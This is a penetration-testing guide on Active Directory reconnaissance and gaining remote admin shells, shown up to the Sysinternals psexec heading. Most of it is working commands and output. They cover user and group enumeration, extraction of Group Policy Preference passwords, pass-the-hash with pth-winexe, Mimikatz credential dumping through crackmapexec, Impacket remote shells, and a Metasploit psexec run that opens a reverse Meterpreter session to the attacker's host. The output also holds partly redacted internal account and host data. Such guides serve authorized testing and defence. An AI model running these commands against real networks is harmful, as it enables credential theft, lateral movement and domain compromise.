===========================================================================
Learning from the field : Active Directory Recon and Administrative shells 
===========================================================================

Once, we have access to **credentials of a domain user of windows domain**, we can utilize the credentials to do windows **active directory enumeration** such as figuring out the domain controllers, users, machines, trust etc. This post looks into the various methods which are available to do the enumeration such as rpclient, enum4linux, netdom, powerview, bloodhound, adexplorer, Jexplorer etc.

Also, once we have **administrative credentials** there are multiple ways to get a **execute remote commands** on the remote machine such winexe, crackmapexec, impacket psexec, smbexec, wmiexec, Metasploit psexec, Sysinternals psexec, task scheduler, remote registry, WinRM, WMI, DCOM, remote desktop etc. We have a look over all the methods with possible examples. 

Did we missed something? please send us a pull request and we will add it. 


Recon Active Directory:
------------------------

rpclient
^^^^^^^^^^

eskoudis presents great amount of information at `Plundering Windows Account Infor via Authenticated SMB Session <https://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions>`_.  carnal0wnage have written `Enumerating user accounts on linux and OSX <http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html>`_ and BlackHills have written `Password Spraying and Other Fun with RPC Client <http://www.blackhillsinfosec.com/?p=4645>`_  Most of the stuff has been taken from the above three.

* Connection:

 ::

  rpcclient -U xxxxs.hxxxx.net/mlxxxxh 10.0.65.103 

* Version of the target Windows machine:

 ::
  
  rpcclient $> srvinfo
  10.0.65.103    Wk Sv BDC Tim NT     
  platform_id     :       500
  os version      :       6.3
  server type     :       0x801033

* enum commands:

 ::

  rpcclient $> enum

  enumalsgroups  enumdomains    enumdrivers    enumkey     enumprivs
  enumdata       enumdomgroups  enumforms      enumports   enumtrust
  enumdataex     enumdomusers   enumjobs       enumprinter

* Tell the current domain 

 ::
  
  enumdomains 
  name:[xxxx] idx:[0x0]
  name:[Builtin] idx:[0x0]

* Enum Domain info

 ::

  rpcclient $> querydominfo 
  Domain               :  xxxx
  Server               :  HMC_PDC-TEMP
  Comment              :      
  Total Users          :  9043
  Total Groups         :  0
  Total Aliases        :  616
  Sequence No          :  1
  Force Logoff         : -1
  Domain Server State  :  0x1
  Server Role          :  ROLE_DOMAIN_BDC
  Unknown 3           :    0x1

* Enum Domain users:

  ::
   
   rpcclient $> enumdomusers 
   user:[administrator] rid:[0x1f4]
   user:[Guest] rid:[0x1f5]
   user:[krbtgt] rid:[0x1f6]
   user:[_STANDARD] rid:[0x3ee]
   user:[Install] rid:[0x3fa]
   user:[sko] rid:[0x43a]
   user:[cap] rid:[0x589]
   user:[zentrale] rid:[0x67f]
   user:[dbserver] rid:[0x7d9]
   user:[JVOO] rid:[0x7fa]
   user:[Standard HMC User Te] rid:[0x8a0]
   user:[event] rid:[0x8d5]
   user:[remote] rid:[0x9ea]
   user:[pda-vis1] rid:[0xb65]
   user:[TestUser] rid:[0xc46]
   user:[oeinstall] rid:[0x1133]
   user:[repro] rid:[0x13c3]

* Enum Domain groups:

 ::

   rpcclient $> enumdomgroups 
   group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
   group:[Domain Admins] rid:[0x200]
   group:[Domain Users] rid:[0x201]
   group:[Domain Guests] rid:[0x202]
   group:[Domain Computers] rid:[0x203]
   group:[Domain Controllers] rid:[0x204]
   group:[Schema Admins] rid:[0x206]
   group:[Enterprise Admins] rid:[0x207]
   group:[Group Policy Creator Owners] rid:[0x208]
   group:[Read-only Domain Controllers] rid:[0x209]
   group:[Cloneable Domain Controllers] rid:[0x20a]
   group:[Protected Users] rid:[0x20d]
   group:[xxxx Users] rid:[0x4d8]
   group:[IC Members] rid:[0x50d]
   group:[Event Management] rid:[0x8d7]
   group:[SMSInternalCliGrp] rid:[0x9f5]
   group:[IT Support] rid:[0x105b]


* Enum Group Information and Group Membership

 ::

  rpcclient $> querygroup 0x200
  Group Name:     Domain Admins
  Description:    Designated administrators of the domain
  Group Attribute:7
  Num Members:16


 ::

  rpcclient $> querygroupmem 0x200
  rid:[0x2227] attr:[0x7]
  rid:[0x3601] attr:[0x7]
  rid:[0x36aa] attr:[0x7]
  rid:[0x36e0] attr:[0x7]
  rid:[0x3c23] attr:[0x7]
  rid:[0x5528] attr:[0x7]
  rid:[0x1f4]  attr:[0x7]
  rid:[0x363b] attr:[0x7]
  rid:[0x573e] attr:[0x7]
  rid:[0x56bc] attr:[0x7]
  rid:[0x5e5e] attr:[0x7]
  rid:[0x7fe1] attr:[0x7]
  rid:[0x86d9] attr:[0x7]
  rid:[0x9367] attr:[0x7]
  rid:[0x829c] attr:[0x7]
  rid:[0xa26e] attr:[0x7]

* Enumerate specfic User/ computer information by RID

 ::

  rpcclient $> queryuser 0x3601
  User Name   :   dummy_s
  Full Name   :   Dummy User
  Home Drive  :   
  Dir Drive   :   
  Profile Path:   
  Logon Script:   
  Description :   E 5.5.2008 Admin
  Workstations:   
  Comment     :   
  Logon Time               :      Tue, 24 Jan 2017 19:28:14 IST
  Logoff Time              :      Thu, 01 Jan 1970 05:30:00 IST
  Kickoff Time             :      Thu, 14 Sep 30828 08:18:05 IST
  Password last set Time   :      Fri, 21 Nov 2008 02:34:34 IST
  Password can change Time :      Fri, 21 Nov 2008 02:34:34 IST
  Password must change Time:      Thu, 14 Sep 30828 08:18:05 IST

* Get Domain Password Policy

 ::

  rpcclient $> getdompwinfo 
  min_password_length: 8
  password_properties: 0x00000000

* Get user password policies

 ::

  rpcclient $> getusrdompwinfo 0x3601
  min_password_length: 8
  &info.password_properties: 0x433e6584 (1128162692)
  0: DOMAIN_PASSWORD_COMPLEX  
  0: DOMAIN_PASSWORD_NO_ANON_CHANGE
  1: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
  0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
  0: DOMAIN_PASSWORD_STORE_CLEARTEXT
  0: DOMAIN_REFUSE_PASSWORD_CHANGE

Enum4linux
^^^^^^^^^^^

Simple wrapper around the tools in the samba package to provide similar functionality to enum.exe (formerly from www.bindview.com).

::

 Usage: ./enum4linux.pl [options] ip

 Options are (like "enum"):
     -U        get userlist
     -M        get machine list*
     -S        get sharelist
     -P        get password policy information
     -G        get group and member list
     -d        be detailed, applies to -U and -S
     -u user   specify username to use (default "")  
     -p pass   specify password to use (default "")   


 Additional options:
    -a        Do all simple enumeration (-U -S -G -P -r -o -n -i).
              This opion is enabled if you don't provide any other options.
    -h        Display this help message and exit
    -r        enumerate users via RID cycling
    -R range  RID ranges to enumerate (default: 500-550,1000-1050, implies -r)
    -K n      Keep searching RIDs until n consective RIDs don't correspond to
              a username.  Impies RID range ends at 999999. Useful 
	      against DCs.
    -l        Get some (limited) info via LDAP 389/TCP (for DCs only)
    -s file   brute force guessing for share names
    -k user   User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none)
              Used to get sid with "lookupsid known_username"
    	      Use commas to try several users: "-k admin,user1,user2"
    -o        Get OS information
    -i        Get printer information
    -w wrkg   Specify workgroup manually (usually found automatically)
    -n        Do an nmblookup (similar to nbtstat)
    -v        Verbose.  Shows full commands being run (net, rpcclient, etc.)

Example: 

::

 enum4linux -P -d xxxx.abcxxx.net -u mluxxxx -p threxxxx 10.0.65.103

Active Directory Explorer ADExplorer
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

As per the technet article `Active Directory Explorer (AD Explorer) <https://technet.microsoft.com/en-us/sysinternals/adexplorer.aspx>`_ is an advanced Active Directory (AD) viewer and editor. We can use AD Explorer to easily navigate an AD database, define favorite locations, view object properties and attributes without having to open dialog boxes, edit permissions, view an object's schema, and execute sophisticated searches that you can save and re-execute. 

JXplorer
^^^^^^^^^

`JXplorer <http://jxplorer.org/>`_ is a cross platform LDAP browser and editor. It is a standards compliant general purpose LDAP client that can be used to search, read and edit any standard LDAP directory, or any directory service with an LDAP or DSML interface.


netdom
^^^^^^^
netdom: netdom is a command-line tool that is built into Windows Server 2008 and Windows Server 2008 R2. It is available if you have the Active Directory Domain Services (AD DS) server role installed. It is also available if you install the Active Directory Domain Services Tools that are part of the Remote Server Administration Tools (RSAT). More information available at `Netdom query <https://technet.microsoft.com/en-us/library/cc835089(v=ws.11).aspx>`_. 

::

  netdom query {/d: | /domain:}<Domain> [{/s: | /server:}<Server>] [{/ud: | /userd:}[<Domain>\]<User> {/pd: | /passwordd}{<Password>|*}] [/verify] [/reset] [/direct] {WORKSTATION|SERVER|DC|OU|PDC|FSMO|TRUST} [{/help | /?}]

  Specifies the type of list to generate. The following list shows the possible objects:
  WORKSTATION: Queries the domain for the list of workstations.
  SERVER: Queries the domain for the list of servers.
  DC   : Queries the domain for the list of domain controllers.
  OU   : Queries the domain for the list of OUs under which the user that you specify can create a computer object.
  PDC  : Queries the domain for the current primary domain controller.
  FSMO : Queries the domain for the current list of operations master role holders. These role holders are also known as flexible single master operations (FSMO).
  TRUST: Queries the domain for the list of its trusts.

* DC: Queries the domain for the list of workstations:

 :: 

  PS C:\> netdom query /domain example.net DC
  List of domain controllers with accounts in the domain:
  
  xxxxDC12
  xxxxDC11
  xxxxDC04
  xxxxDC03
  The command completed successfully.

* PDC: Queries the domain for the current primary domain controller

 ::
 
  PS C:\> netdom query /domain example.net PDC
  Primary domain controller for the domain:
  
  xxxxDC03.example.net
  The command completed successfully.

* FSMO: Queries the domain for the current list of operations master role holders.  

 ::

  PS C:\> netdom query /domain example.net FSMO
  Schema master               xxxxDC03.example.net
  Domain naming master        xxxxDC03.example.net
  PDC                         xxxxDC03.example.net
  RID pool manager            xxxxDC03.example.net
  Infrastructure master       xxxxDC03.example.net
  The command completed successfully. 

* TRUST: Queries the domain for the list of its trusts

 ::

  PS C:\> netdom query /domain example.net TRUST
  Direction Trusted\Trusting domain      Trust type
  ========= =======================      ==========   
  
  <->       xxxx.xxxxxx.net              Direct
  <->       xxxx.example.net             Direct
  <->       XX.XXXxXX.NET                Direct

* OU: Queries the domain for the list of OUs under which the user that you specify can create a computer object.

 ::

  PS C:\> netdom query /domain abc.example.net OU
  List of Organizational Units within which the specified user can create a
  machine account:
  
  OU=Domain Controllers,DC=abc,DC=example,DC=net
  OU=ABC-Admin,DC=abc,DC=example,DC=net
  OU=ServiceAccounts,OU=ABC-Admin,DC=abc,DC=example,DC=net
  OU=Users,OU=ABC-Admin,DC=abc,DC=example,DC=net
  OU=Groups,OU=ABC-Admin,DC=abc,DC=example,DC=net
  OU=Service Accounts,DC=abc,DC=example,DC=net
  OU=Servers,OU=ABC-Admin,DC=abc,DC=example,DC=net
  DC=abc,DC=example,DC=net
  The command completed successfully.

* SERVER/ WORKSTATION: Queries the domain for the list of servers/ workstations

 ::   

  PS C:\> netdom query /domain abc.example.net WORKSTATION
  List of workstations with accounts in the domain:

  ABCDC02      ( Workstation or Server )
  ABCDC01      ( Workstation or Server )
  ABCDC03      ( Workstation or Server )
  ABCDC04      ( Workstation or Server )
  BSKMACDB62   ( Workstation or Server )

  The command completed successfully.

  PS C:\>


Get sessions of remote machines
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

* Powerview Get-NetSession

* net session

 * Net session of current computer

  ::

   net session

   Computer               User name            Client Type       Opens Idle time

   -------------------------------------------------------------------------------
   \\127.0.0.1            Administrat0r                              1 05D 22H 02M

   The command completed successfully.

 * Net session of remote computer
 
  :: 

   net session \\computername

* Wmi: We can use wmi to get the remote logged on users. However, I believe to run wmi on remote machine, you need to be administrator of that machine.

 ::

  wmic:root\cli> /node:"computername" path win32_loggeduser get antecedent
  
  \\.\root\cimv2:Win32_Account.Domain="ABCROOT",Name="axx.xxxxx"
  \\.\root\cimv2:Win32_Account.Domain="ABCROOT",Name="srv.xxxxx"
  \\.\root\cimv2:Win32_Account.Domain="ABCROOT",Name="axx.xxxxx"
  \\.\root\cimv2:Win32_Account.Domain="MA",Name="axxd.xxxxx"
  \\.\root\cimv2:Win32_Account.Domain="DC",Name="ANONYMOUS LOGON"



View users in Domain / Workgroup
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
* Powerview Get-NetUser

* net user /domain

* wmi

 Domain users:

 :: 

  wmic useraccount list /format:list 


View machines in Domain/ Workgroup
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

* Powerview Get-NetComputers

* net view /domain ? -- check the functionality

* View machines affected by GPP vulnerability

 When we run Get-GPPPassword, we get output like

 ::

  Password: password@123
  Changed : 2013-07-02 01:01:23
  Username: Administrator
  NewName : 
  File    : \\Demo.lab\sysvol\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\DataSources\{DataSouces| Groups| ScheduledTasks.xml

 To get the computers using the passwords set by the GPP, we can use

 ::

  Get-NetOU -GUID "{31B2F340-016D-11D2-945F-00C04FB984F9}" | %{ Get-NetComputer -ADSPath $_ }

 Get-NetSite function, which returns the current sites for a domain, also accepts the -GUID filtering flag. This information has been taken from harmj0y blog `gpp and powerview <http://www.harmj0y.net/blog/powershell/gpp-and-powerview/>`_ 

 More information about GPP should be read from Sean Metcalf blog `Using Group Policy Preferences for Password Management = Bad Idea <https://adsecurity.org/?p=384>`_ and `Finding Passwords in SYSVOL & Exploiting Group Policy Preferences <https://adsecurity.org/?p=2288>`_ 

 There are various methods to figure out the GPP Password if it's set.

 * `Get-GPPPassword.ps1 <https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1>`_ :  PowerShell script that can identify and extract the password(s) stored in Group Policy Preferences using the MSDN AES key. 

 * If you have a domain user credentials we can use metasploit auxilary module - SMB Group Policy Preference Saved Passwords Enumeration : This module enumerates files from target domain controllers and connects to them via SMB. It then looks for Group Policy Preference XML files containing local/domain user accounts and passwords and decrypts them using Microsofts public AES key. This module has been tested successfully on a Win2k8 R2 Domain Controller.

  ::

   use auxiliary/scanner/smb/smb_enum_gpp
   set smbdomain example.com
   set smbuser user
   set smbpass pass
   set rhosts 192.168.56.2


  Thanks to Tanoy Bose for informing about this!. Previously, we used to manually search the SYSVOL location! ( When for some reason Get-GPPPassword doesn't work! )

 * If you have a meterpreter session, we can use metasploit post module - Windows Gather Group Policy Preference Saved Passwords : This module enumerates the victim machine's domain controller and connects to it via SMB. It then looks for Group Policy Preference XML files containing local user accounts and passwords and decrypts them using Microsofts public AES key. Cached Group Policy files may be found on end-user devices if the group policy object is deleted rather than unlinked. 

  :: 

   use post/windows/gather/credentials/gpp
   set session <Session_Number>

 * Reading Group Policies manually stored here: \\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\

View group in Domain / Workgroup
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

* Powerview Get-NetGroupMember

* Net group / domain? options

* Windows Resource Kit Local/ Global executable

 * Global.exe 

  ::

   PS C:\> .\global.exe

   Displays members of global groups on remote servers or domains.

   GLOBAL group_name domain_name | \\server

   group_name    The name of the global group to list the members of.
   domain_name   The name of a network domain.
   \\server      The name of a network server.

   Examples:
   Global "Domain Users" EastCoast
   Displays the members of the group 'Domain Users' in the EastCoast domain.

   Global PrintUsers \\BLACKCAT
   Displays the members of the group PrintUsers on server BLACKCAT.

   Notes:
   Names that include space characters must be enclosed in double quotes.
   To list members of local groups use Local.Exe.
   To get the Server name for a give Domain use GetDC.Exe.

  Example:

  ::

   PS C:\> .\global.exe "Domain Admins" \\domainname
   Uraxxxx
   axx.xxxxx
   axx.xxxxx2
   axx.xxxxxx3


* BloodHound Group Memberships

* wmi user groups
 
 ::

  wmic group list brief
  ABCD\SUS Administrator    ABCD          SUS Administrator                                         S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-7357
  ABCD\VPN Admins           ABCD          VPN Admins                                                S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-8728
  ABCD\VPN Users            ABCD          VPN Users                                                 S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-9229
  ABCD\XXX - OER Users      ABCD          XXX - OER Users                                           S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-5095


Hunting for a particular User?
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

* Powerview Invoke-UserHunter

* BH users_sessions

* EventLog AD? How? Not yet successful!

* Finding which machine belong to which user? Any other way than above?

* Machine belongs to which user AD Properties -- GETADObject (Tanoy)


Remote Code Execution Methods:
------------------------------

A lot of details for Remote Code execution has already been mentioned by Rop Nop in his three parts `Part 1: Using credentials to own windows boxes <https://blog.ropnop.com/using-credentials-to-own-windows-boxes/>`_ , `Part2: PSExec and Services <https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/>`_ and `Part: 3 Wmi and WinRM <https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/>`_ and by scriptjunkie in his blog `Authenticated Remote Code Execution Methods in Windows <https://www.scriptjunkie.us/2013/02/authenticated-remote-code-execution-methods-in-windows/>`_ 

We have just summarized all in one page with *working* examples whereever possible.

Winexe
^^^^^^

* Linux Binary pth-winexe

 ::

  winexe version 1.1
  Usage: winexe [OPTION]... //HOST COMMAND
  Options:
   -h, --help                                  Display help message
   -V, --version                               Display version number
   -U, --user=[DOMAIN/]USERNAME[%PASSWORD]     Set the network username
   -A, --authentication-file=FILE              Get the credentials from a file
   -N, --no-pass                               Do not ask for a password
   -k, --kerberos=STRING                       Use Kerberos, -k [yes|no]
   -d, --debuglevel=DEBUGLEVEL                 Set debug level
       --uninstall                             Uninstall winexe service after remote execution
       --reinstall                             Reinstall winexe service before remote execution
       --system                                Use SYSTEM account
       --profile                               Load user profile
       --convert                               Try to convert characters between local and remote code-pages
       --runas=[DOMAIN\]USERNAME%PASSWORD      Run as the given user (BEWARE: this password is sent in cleartext over the network!)
       --runas-file=FILE                       Run as user options defined in a file
       --interactive=0|1                       Desktop interaction: 0 - disallow, 1 - allow. If allow, also use the --system switch (Windows requirement). Vista does not support this option.
       --ostype=0|1|2                          OS type: 0 - 32-bit, 1 - 64-bit, 2 - winexe will decide. Determines which version (32-bit or 64-bit) of service will be installed.
  
 Example with pth:
 ::

  pth-winexe -U ./Administrator%aad3b435b51404eeaad3b435b51404ee:4b579a266f697c2xxxxxxxxx //10.145.X.X cmd.exe
  pth-winexe -U EXAMPLE/Administrator%example@123 //10.145.X.X cmd.exe

* Windows Binary win-exe

 win-exe can be downloaded from `winexe <https://sourceforge.net/projects/winexe/>`_ 

 commands and usage is same as linux binary pth-winexe. However, it needed to be compiled from the source.

crackmapexec
^^^^^^^^^^^^
`CrackMapExec <https://github.com/byt3bl33d3r/CrackMapExec>`_ is quite awesome tool when it comes to remote command execution. Read the `wiki <https://github.com/byt3bl33d3r/CrackMapExec/wiki>`_ 

::

  positional arguments:
  target                The target IP(s), range(s), CIDR(s), hostname(s), FQDN(s) or file(s) containg a list of targets

  optional arguments:
    -h, --help            show this help message and exit
    -v, --version         show program's version number and exit
    -t THREADS            Set how many concurrent threads to use (default: 100)
    -u USERNAME [USERNAME ...]  Username(s) or file(s) containing usernames
    -d DOMAIN             Domain name
    --local-auth          Authenticate locally to each target
    -p PASSWORD [PASSWORD ...]  Password(s) or file(s) containing passwords
    -H HASH [HASH ...]    NTLM hash(es) or file(s) containing NTLM hashes
    -M MODULE, --module MODULE Payload module to use
    -MC CHAIN_COMMAND, --module-chain CHAIN_COMMAND  Payload module chain command string to run
    -o MODULE_OPTION [MODULE_OPTION ...] Payload module options
    -L, --list-modules    List available modules
    --show-options        Display module options
    --verbose             Enable verbose output

  Credential Gathering:
  Options for gathering credentials

  --sam                 Dump SAM hashes from target systems
  --lsa                 Dump LSA secrets from target systems
  --ntds {vss,drsuapi}  Dump the NTDS.dit from target DCs using the specifed method
                        (drsuapi is the fastest)
  --ntds-history        Dump NTDS.dit password history
  --ntds-pwdLastSet     Shows the pwdLastSet attribute for each NTDS.dit account
  --wdigest {enable,disable}
                        Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
  Mapping/Enumeration:
  Options for Mapping/Enumerating

  --shares              Enumerate shares and access
  --uac                 Checks UAC status
  --sessions            Enumerate active sessions
  --disks               Enumerate disks
  --users               Enumerate users
  --rid-brute [MAX_RID]
                        Enumerate users by bruteforcing RID's (default: 4000)
  --pass-pol            Dump password policy
  --lusers              Enumerate logged on users
  --wmi QUERY           Issues the specified WMI query
  --wmi-namespace NAMESPACE
                        WMI Namespace (default: //./root/cimv2)

  Command Execution:
  Options for executing commands

  --exec-method {smbexec,wmiexec,atexec}
                        Method to execute the command. Ignored if in MSSQL mode (default: wmiexec)
  --force-ps32          Force the PowerShell command to run in a 32-bit process
  --no-output           Do not retrieve command output
  -x COMMAND            Execute the specified command
  -X PS_COMMAND         Execute the specified PowerShell command


Modules in crackmapexec

::

 crackmapexec -L
 06-05-2016 14:08:03 [*] empire_exec          Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
 06-05-2016 14:08:03 [*] getgroups            Wrapper for PowerView's Get-NetGroup function
 06-05-2016 14:08:03 [*] shellinject          Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
 06-05-2016 14:08:03 [*] com_exec             Executes a command using a COM scriptlet to bypass whitelisting
 06-05-2016 14:08:03 [*] tokens               Enumerates available tokens using Powersploit's Invoke-TokenManipulation
 06-05-2016 14:08:03 [*] getgroupmembers      Wrapper for PowerView's Get-NetGroupMember function
 06-05-2016 14:08:03 [*] mimikatz             Executes PowerSploit's Invoke-Mimikatz.ps1 script
 06-05-2016 14:08:03 [*] peinject             Downloads the specified DLL/EXE and injects it into memory using PowerSploit's Invoke-ReflectivePEInjection.ps1 script
 06-05-2016 14:08:03 [*] tokenrider           Allows for automatic token enumeration, impersonation and mass lateral spread using privileges instead of dumped credentials
 06-05-2016 14:08:03 [*] metinject            Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
 06-05-2016 14:08:03 [*] getcomputers         Wrapper for PowerView's Get-NetGroup function
 06-05-2016 14:08:03 [*] KTHXBYE!

Using a module

Simply specify the module name with the -M flag:

::

 crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -M mimikatz
 06-05-2016 14:13:59 CME          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)

Use the -M flag to specify the module and the --show-options argument to view the module's supported options:

::
 
 #~ crackmapexec -M mimikatz --show-options
 06-05-2016 14:10:33 [*] mimikatz module options:
 COMMAND Mimikatz command to execute (default: 'sekurlsa::logonpasswords')

Using module options
Module options are specified with the -o flag. All options are specified in the form of KEY=value (msfvenom style)

::

 crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND=privilege::debug

Impacket psexec/ smbexe/ wmiexec
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

* Impacket psexec

  ::

   ./psexec.py -debug Admini:Password@10.0.X.X

   Impacket v0.9.16-dev - Copyright 2002-2016 Core Security Technologies
 
   [*] Trying protocol 445/SMB...
 
   [*] Requesting shares on 10.0.5.180.....
   [*] Found writable share ADMIN$
   [*] Uploading file kBibbkKL.exe
   [*] Opening SVCManager on 10.0.5.180.....
   [*] Creating service cvZN on 10.0.5.180.....
   [*] Starting service cvZN.....
   [-] Pipe not ready, aborting
   [*] Opening SVCManager on 10.0.5.180.....
   [*] Stoping service cvZN.....
   [*] Removing service cvZN.....
   [*] Removing file kBibbkKL.exe.....

* Impacket smbexec

 ::

  ./smbexec.py -debug Admini:Password@10.0.5.180

  Impacket v0.9.16-dev - Copyright 2002-2016 Core Security Technologies

  [+] StringBinding ncacn_np:10.0.5.180[\pipe\svcctl]
  [+] Executing %COMSPEC% /Q /c echo cd  ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
  [!] Launching semi-interactive shell - Careful what you execute

  C:\Windows\system32>ipconfig
  [+] Executing %COMSPEC% /Q /c echo ipconfig ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat

  Windows IP Configuration


  Ethernet adapter Local Area Connection:

  Connection-specific DNS Suffix  . : 
  Link-local IPv6 Address . . . . . : fe80::4546:b672:307:b488%10
  IPv4 Address. . . . . . . . . . . : 10.0.X.XX
  Subnet Mask . . . . . . . . . . . : 255.255.254.0
  Default Gateway . . . . . . . . . : 10.0.X.1

  Tunnel adapter isatap.{EB92DEE7-521B-4E14-84C2-0E9B9E96563E}:

  Media State . . . . . . . . . . . : Media disconnected
  Connection-specific DNS Suffix  . : 

  Tunnel adapter Local Area Connection* 11:

  Media State . . . . . . . . . . . : Media disconnected
  Connection-specific DNS Suffix  . : 

  C:\Windows\system32>

* Impacket wmiexec

 ::

  Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
  
  usage: wmiexec.py [-h] [-share SHARE] [-nooutput] [-debug]
                    [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                    [-dc-ip ip address]
                    target [command [command ...]]

  Executes a semi-interactive shell using Windows Management Instrumentation.

  positional arguments:
    target                [[domain/]username[:password]@]<targetName or address>
    command               command to execute at the target. If empty it will
                          launch a semi-interactive shell

  authentication:
    -hashes LMHASH:NTHASH
                          NTLM hashes, format is LMHASH:NTHASH
    -no-pass              don't ask for password (useful for -k)
    -k                    Use Kerberos authentication. Grabs credentials from
                          ccache file (KRB5CCNAME) based on target parameters.
                          If valid credentials cannot be found, it will use the
                          ones specified in the command line
    -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                          bits)
    -dc-ip ip address     IP Address of the domain controller. If ommited it use
                          the domain part (FQDN) specified in the target
                          parameter

 Example with password:

 ::

  wmiexec.py -debug Administrat0r:Passw0rd\!\!@10.0.5.180

  Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

  [*] SMBv2.1 dialect used
  [+] Target system is 10.0.5.180 and isFDQN is False
  [+] StringBinding: \\\\xxxxHBKS1739[\\PIPE\\atsvc]
  [+] StringBinding: xxxxhbks1739[49155]
  [+] StringBinding: 10.0.5.180[49155]
  [+] StringBinding chosen: ncacn_ip_tcp:10.0.5.180[49155]
  [!] Launching semi-interactive shell - Careful what you execute
  [!] Press help for extra shell commands
  C:\>hostname
  xxxxhbks1739

  C:\>whoami
  xxxxhbks1739\administrat0r

  C:\>

 Example with hashes:
 ::

    wmiexec.py -debug -hashes xxxxxxxxxxxxxx:xxxxxxx  Administrat0r@10.0.5.180
  
  

Metasploit psexec
^^^^^^^^^^^^^^^^^^^

Metasploit psexec have three methods to invoke, 

::

   msf exploit(psexec) > show targets 

   Exploit targets:

   Id  Name
   --  ----
    0   Automatic
    1   PowerShell
    2   Native upload
    3   MOF upload


Let's first try with target 2: Native upload

::

  msf exploit(psexec) > set target 2
  target => 2

  [*] Started reverse TCP handler on 10.11.43.116:4444 
  [*] 10.0.5.180:445 - Connecting to the server...
  [*] 10.0.5.180:445 - Authenticating to 10.0.5.180:445 as user 'Administrat0r'...
  [*] 10.0.5.180:445 - Uploading payload...
  [*] 10.0.5.180:445 - Created \hnFrgUVk.exe...
  [-] 10.0.5.180:445 - Service failed to start - ACCESS_DENIED
  [*] 10.0.5.180:445 - Deleting \hnFrgUVk.exe...
  [*] Exploit completed, but no session was created.


We can see that the exploit was completed however, no session was created. Also the antivirus provided an alert.

::
  
 Datei "C:\Windows\hnFrgUVk.exe" belongs to virus/spyware 'Troj/Swrort-K'.

Let's try with target 1, the powershell 
  
::

  msf exploit(psexec) > set smbdomain .
  smbdomain => .
  msf exploit(psexec) > set smbuser Administrat0r
  smbuser => Administrat0r
  msf exploit(psexec) > set smbpass Passw0rd!!
  smbpass => Passw0rd!!
  msf exploit(psexec) > set rhost 10.0.5.180
  rhost => 10.0.5.180
  msf exploit(psexec) > run 

  [*] Started reverse TCP handler on 10.11.43.116:4444 
  [*] 10.0.5.180:445 - Connecting to the server...
  [*] 10.0.5.180:445 - Authenticating to 10.0.5.180:445 as user 'Administrat0r'...
  [*] 10.0.5.180:445 - Selecting PowerShell target
  [*] 10.0.5.180:445 - Executing the payload...
  [+] 10.0.5.180:445 - Service start timed out, OK if running a command or non-service executable...
  [*] Exploit completed, but no session was created.
  msf exploit(psexec) > run 
  
  [*] Started reverse TCP handler on 10.11.43.116:4444 
  [*] 10.0.5.180:445 - Connecting to the server...
  [*] 10.0.5.180:445 - Authenticating to 10.0.5.180:445 as user 'Administrat0r'...
  [*] 10.0.5.180:445 - Selecting PowerShell target
  [*] 10.0.5.180:445 - Executing the payload...
  [+] 10.0.5.180:445 - Service start timed out, OK if running a command or non-service executable...
  [*] Sending stage (957487 bytes) to 10.0.5.180
  [*] Meterpreter session 1 opened (10.11.43.116:4444 -> 10.0.5.180:64783) at 2017-02-20 16:31:41 +0530
  
  meterpreter > 

Let's try also with target 3: MOF Upload

:: 

   msf exploit(psexec) > set target 3
   target => 3

   [*] Started reverse TCP handler on 10.11.43.116:4444 
   [*] 10.0.5.180:445 - Connecting to the server...
   [*] 10.0.5.180:445 - Authenticating to 10.0.5.180:445 as user 'Administrat0r'...
   [*] 10.0.5.180:445 - Trying wbemexec...
   [*] 10.0.5.180:445 - Uploading Payload...
   [*] 10.0.5.180:445 - Created %SystemRoot%\system32\KiaHTgBg.exe
   [*] 10.0.5.180:445 - Uploading MOF...
   [*] 10.0.5.180:445 - Created %SystemRoot%\system32\wbem\mof\5SZ1WZENmHyays.MOF
   [*] Exploit completed, but no session was created.
 
 
Sysinternals psexec
^^^^^^^^^^^^^^^^^^^

